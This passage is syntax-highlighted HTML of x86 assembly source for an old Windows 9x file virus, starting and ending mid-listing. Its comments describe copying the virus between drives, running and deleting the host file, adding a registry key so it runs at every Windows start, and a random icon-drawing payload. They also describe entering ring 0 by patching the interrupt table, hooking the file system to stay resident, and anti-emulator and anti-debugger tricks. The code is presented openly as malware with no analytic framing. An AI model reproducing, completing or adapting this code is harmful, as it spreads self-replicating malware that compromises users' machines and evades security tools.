    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">I25h</span><span class="sc0">               </span><span class="sc1">;read it</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">c_exit</span><span class="sc0">               </span><span class="sc1">;if error, then quit</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">1ah</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;store cluster_ptr</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">1ch</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;store filesize</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;restore cluster_ptr</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">1ah</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;...</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;restore filesize</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">1ch</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;...</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">WriteROOT</span><span class="sc0">              </span><span class="sc1">;restore directory record</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">1ch</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;restore filesize</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">1ah</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;restore cluster_ptr</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">c_exit</span><span class="sc0">               </span><span class="sc1">;if error, then quit</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">dstFile</span><span class="sc0">         </span><span class="sc1">;destination path+filename</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">srcFile</span><span class="sc0">         </span><span class="sc1">;source path+filename</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CopyFileA</span><span class="sc0">              </span><span class="sc1">;copy virus from A: to C: drive</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">               </span><span class="sc1">;error?</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">err_cpa</span><span class="sc0">               </span><span class="sc1">;yeah, quit</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">lppiProcInfo</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">lpsiStartInfo</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CreateProcessA</span><span class="sc0">         </span><span class="sc1">;execute original file (host)</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">               </span><span class="sc1">;error?</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">err_cpa</span><span class="sc0">               </span><span class="sc1">;yeah, quit</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hProcess</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;get handle of host process</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">                 </span><span class="sc1">;wait for its signalisation</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">                </span><span class="sc1">;...</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">WaitForSingleObject</span><span class="sc0">        </span><span class="sc1">;...</span><span class="sc0">
    
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc0">            </span><span class="sc1">;close handle of host process</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hThread</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc0">            </span><span class="sc1">;close handle of host thread</span><span class="sc0">

</span><span class="sc5">err_cpa</span><span class="sc4">:</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">WriteROOT</span><span class="sc0">              </span><span class="sc1">;restore ROOT</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">DeleteFileA</span><span class="sc0">            </span><span class="sc1">;and delete host from C: drive</span><span class="sc0">

</span><span class="sc5">c_exit</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">              </span><span class="sc1">;get handle of vwin32 driver</span><span class="sc0">
</span><span class="sc5">d_handle</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc0">            </span><span class="sc1">;and close it</span><span class="sc0">

</span><span class="sc5">regSet</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">tmp</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">hKey</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">subKey</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">80000002h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RegCreateKeyExA</span><span class="sc0">            </span><span class="sc1">;open registry</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">r_exit</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">regSize</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">regFile</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">regVal</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hKey</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                    </span><span class="sc1">;set key - virus will be executed</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RegSetValueExA</span><span class="sc0">         </span><span class="sc1">;everytime Windows will start</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RegCloseKey</span><span class="sc0">            </span><span class="sc1">;close registry</span><span class="sc0">

    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">310fh</span><span class="sc0">               </span><span class="sc1">;RDTCS</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'Y'</span><span class="sc0">             </span><span class="sc1">;1:255 possibility</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">r_exit</span><span class="sc0">              </span><span class="sc1">;payload won't be activated</span><span class="sc0">

</span><span class="sc5">payload</span><span class="sc4">:</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                  </span><span class="sc1">;payload will be activated</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetDC</span><span class="sc0">              </span><span class="sc1">;get device context of desktop</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">               </span><span class="sc1">;save HDC to EBX</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">29ah</span><span class="sc0">               </span><span class="sc1">;ID of icon</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">400000h</span><span class="sc0">                </span><span class="sc1">;base of virus</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">LoadIconA</span><span class="sc0">              </span><span class="sc1">;load icon</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                </span><span class="sc1">;EDX=0</span><span class="sc0">
</span><span class="sc5">l_payload</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">                  </span><span class="sc1">;store all registers</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;icon handle</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                </span><span class="sc1">;Y possition</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                  </span><span class="sc1">;X possition</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                </span><span class="sc1">;device context handle</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">DrawIcon</span><span class="sc0">               </span><span class="sc1">;draw icon on desktop</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">                   </span><span class="sc1">;restore all registers</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">30</span><span class="sc0">                </span><span class="sc1">;increment Y possition</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">l_payload</span><span class="sc0">              </span><span class="sc1">;long payload :)</span><span class="sc0">

</span><span class="sc5">r_exit</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc5">@SEH_RemoveFrame</span><span class="sc0">            </span><span class="sc1">;remove SEH frame</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc0">            </span><span class="sc1">;and exit</span><span class="sc0">

</span><span class="sc5">NewThread</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">                  </span><span class="sc1">;store all registers</span><span class="sc0">
</span><span class="sc5">t_patch</span><span class="sc4">:</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">                   </span><span class="sc1">;will be patched - anti-emulator</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">EnterRing0</span><span class="sc0">             </span><span class="sc1">;jmp to Ring-0</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">                  </span><span class="sc1">;store all registers</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dr0</span><span class="sc0">                </span><span class="sc1">;get debug register</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'YOBE'</span><span class="sc0">             </span><span class="sc1">;check if we r already resident</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">quitR0</span><span class="sc0">               </span><span class="sc1">;yeah, quit</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">24576</span><span class="sc0">
    </span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc5">IFSMgr_GetHeap</span><span class="sc0">          </span><span class="sc1">;alocate memory for our virus</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                 </span><span class="sc1">;correct stack</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">               </span><span class="sc1">;get address to EDI</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">               </span><span class="sc1">;error?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">quitR0</span><span class="sc0">               </span><span class="sc1">;yeah, quit</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                </span><span class="sc1">;copy virus file to memory</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">vbuffer</span><span class="sc0">         </span><span class="sc1">;from</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">24576</span><span class="sc4">/</span><span class="sc2">4</span><span class="sc0">            </span><span class="sc1">;how many</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsd</span><span class="sc0">               </span><span class="sc1">;move!</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">600h</span><span class="sc4">+</span><span class="sc5">membase</span><span class="sc4">-</span><span class="sc5">Start</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc1">;save address</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">600h</span><span class="sc4">+</span><span class="sc5">NewIFSHandler</span><span class="sc4">-</span><span class="sc5">Start</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;pointer to new handler</span><span class="sc0">
    </span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc5">IFSMgr_InstallFileSystemApiHook</span><span class="sc0"> </span><span class="sc1">;install file system hook</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                 </span><span class="sc1">;correct stack</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">600h</span><span class="sc4">+</span><span class="sc5">OldIFSHandler</span><span class="sc4">-</span><span class="sc5">Start</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'YOBE'</span><span class="sc0">             </span><span class="sc1">;mark debug register as "already</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dr0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;resident flag" - anti-debugger</span><span class="sc0">
</span><span class="sc5">quitR0</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">p_jmp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">90909090h</span><span class="sc0">    </span><span class="sc1">;patch code - anti-emulator</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">                   </span><span class="sc1">;restore all registers</span><span class="sc0">
    </span><span class="sc6">iretd</span><span class="sc0">                   </span><span class="sc1">;and quit from Ring-0</span><span class="sc0">

</span><span class="sc5">EnterRing0</span><span class="sc4">:</span><span class="sc0">                                     </span><span class="sc1">;Ring0 port</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                 </span><span class="sc1">;get address</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">                                  </span><span class="sc1">;store registers</span><span class="sc0">
        </span><span class="sc6">sidt</span><span class="sc0"> </span><span class="sc10">fword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">;load 6byte long IDT address</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">                                   </span><span class="sc1">;restore registers</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-(</span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">3</span><span class="sc4">)</span><span class="sc0">                         </span><span class="sc1">;move to int3</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">                    </span><span class="sc1">;save original IDT</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">                                   </span><span class="sc1">;modify IDT</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                                 </span><span class="sc1">;move by 2</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                                 </span><span class="sc1">;...</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">                    </span><span class="sc1">;save original IDT</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                                </span><span class="sc1">;save pointer</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0eeh</span><span class="sc0">                            </span><span class="sc1">;IDT FLAGs</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">                                   </span><span class="sc1">;save it</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                                 </span><span class="sc1">;save some selectors</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                                 </span><span class="sc1">;...</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">                                   </span><span class="sc1">;JuMpToRiNg0!</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                                  </span><span class="sc1">;restore selectors</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                                  </span><span class="sc1">;...</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                                 </span><span class="sc1">;restore ptr</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">                             </span><span class="sc1">;move with ptr</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">;and restore IDT</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">                     </span><span class="sc1">;...</span><span class="sc0">
</span><span class="sc5">p_jmp</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                 </span><span class="sc1">;some silly loop to fool</span><span class="sc0">
        </span><span class="sc6">cdq</span><span class="sc0">                                     </span><span class="sc1">;some AVs. Will be overwritten</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">p_jmp</span><span class="sc0">                               </span><span class="sc1">;with NOPs l8r by int handler</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">e_patch</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">9090h</span><span class="sc0">       </span><span class="sc1">;again, new overwriting of code</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">                   </span><span class="sc1">; - anti-emulator</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">                 </span><span class="sc1">;restore all registers and quit</span><span class="sc0">

</span><span class="sc5">OpenDriver</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">4000000h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CreateFileA</span><span class="sc0">            </span><span class="sc1">;open driver</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">;increment handle</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">                 </span><span class="sc1">;quit</span><span class="sc0">

</span><span class="sc5">NewIFSHandler</span><span class="sc4">:</span><span class="sc0">                  </span><span class="sc1">;file system handler</span><span class="sc0">
    </span><span class="sc6">enter</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                </span><span class="sc1">;reserve space in stack</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">1ch</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;for parameters</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;store parameters</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;for next handler</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">0ch</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">

